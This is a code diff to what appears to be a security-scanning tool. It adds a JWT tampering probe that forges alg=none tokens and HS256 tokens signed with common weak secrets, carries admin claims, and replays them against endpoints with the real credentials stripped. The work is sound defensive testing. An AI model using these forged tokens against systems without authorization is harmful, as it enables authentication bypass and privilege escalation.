@@ -13,6 +13,10 @@ same shape for filesystem-read and client-controlled-redirect surfaces.
 """
 from __future__ import annotations
 
+import base64
+import hashlib
+import hmac
+import json
 import re
 import uuid
 
@@ -258,6 +262,114 @@ def build_auth_scope_bypass(
         description=(
             f"Access {method} {path} without required scope '{scope_label}'. "
             "A 2xx response indicates broken function-level authorization."
+        ),
+        target_node_ids=[endpoint_id],
+        impact_score=chain.pre_score,
+        chain=chain,
+    )
+
+
+_JWT_WEAK_SECRETS: tuple[str, ...] = ("secret", "changeit", "your-256-bit-secret")
+
+_JWT_FORGED_CLAIMS: dict = {
+    "sub": "nuguard-jwt-probe",
+    "role": "admin",
+    "admin": True,
+    "isAdmin": True,
+}
+
+
+def _b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
+
+
+def _jwt_segment(obj: dict) -> str:
+    return _b64url(json.dumps(obj, separators=(",", ":")).encode())
+
+
+def _forge_jwt_alg_none() -> str:
+    """Unsigned token with alg=none — trailing dot, empty signature segment."""
+    header = _jwt_segment({"alg": "none", "typ": "JWT"})
+    payload = _jwt_segment(_JWT_FORGED_CLAIMS)
+    return f"{header}.{payload}."
+
+
+def _forge_jwt_hs256(secret: str) -> str:
+    """HS256 token signed with a guessable/default secret."""
+    header = _jwt_segment({"alg": "HS256", "typ": "JWT"})
+    payload = _jwt_segment(_JWT_FORGED_CLAIMS)
+    signing_input = f"{header}.{payload}".encode()
+    signature = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
+    return f"{header}.{payload}.{_b64url(signature)}"
+
+
+def build_jwt_tampering_probe(
+    endpoint_id: str,
+    endpoint_name: str,
+    path: str,
+    method: str = "GET",
+    request_body_schema: dict[str, str] | None = None,
+) -> AttackScenario:
+    """Probe a JWT-protected endpoint with forged tokens.
+
+    Sends the request with any real credentials stripped and replaced by a
+    forged ``Authorization: Bearer <token>`` header, covering two classic JWT
+    implementation flaws: ``alg: none`` (an unsigned token accepted because
+    the verifier trusts the token's own ``alg`` header instead of pinning an
+    expected algorithm) and a weak/guessable HMAC secret — a small dictionary
+    of common defaults (``"secret"``, ...). A 2xx response to either forged
+    token means the server accepted a token it never actually verified.
+
+    Deliberately out of scope for v1: RS256->HS256 algorithm-confusion (needs
+    the server's real public key, which the SBOM doesn't capture) and
+    brute-forcing beyond the small fixed secret dictionary above.
+    """
+    body: dict | None = None
+    if method in ("POST", "PUT", "PATCH") and request_body_schema:
+        body = _build_realistic_body(request_body_schema)
+
+    forged: list[tuple[str, str]] = [("alg=none", _forge_jwt_alg_none())]
+    forged += [(f"weak secret {secret!r}", _forge_jwt_hs256(secret)) for secret in _JWT_WEAK_SECRETS]
+
+    chain_id = str(uuid.uuid4())
+    steps = [
+        ExploitStep(
+            step_id=f"{chain_id}_s{i + 1}",
+            step_type="INVOKE",
+            description=f"Access {endpoint_name} with a forged JWT ({label})",
+            payload="",
+            target_path=path,
+            http_method=method,
+            http_body=body,
+            target_node_id=endpoint_id,
+            success_signal=HTTP_2XX_SENTINEL,
+            on_failure="skip" if i < len(forged) - 1 else "abort",
+            use_llm_eval=True,
+            strip_auth=True,
+            extra_headers={"Authorization": f"Bearer {token}"},
+        )
+        for i, (label, token) in enumerate(forged)
+    ]
+    chain = ExploitChain(
+        chain_id=chain_id,
+        goal_type=GoalType.API_ATTACK,
+        scenario_type=ScenarioType.JWT_TAMPERING,
+        sbom_path=[endpoint_id],
+        owasp_asi_ref="ASI03 – Identity and Privilege Abuse",
+        owasp_llm_ref="LLM05 – Improper Output Handling",
+        steps=steps,
+    )
+    chain.pre_score = pre_score(chain, has_unauth_entry=True)
+    return AttackScenario(
+        scenario_id=str(uuid.uuid4()),
+        goal_type=GoalType.API_ATTACK,
+        scenario_type=ScenarioType.JWT_TAMPERING,
+        title=f"JWT Tampering — {endpoint_name}",
+        description=(
+            f"Access {method} {path} with a forged JWT (alg=none, and HS256 "
+            f"signed with {len(_JWT_WEAK_SECRETS)} common weak secrets) in "
+            f"place of real credentials.  A 2xx response confirms the server "
+            f"accepts a token it never verified."
         ),
         target_node_ids=[endpoint_id],
         impact_score=chain.pre_score,
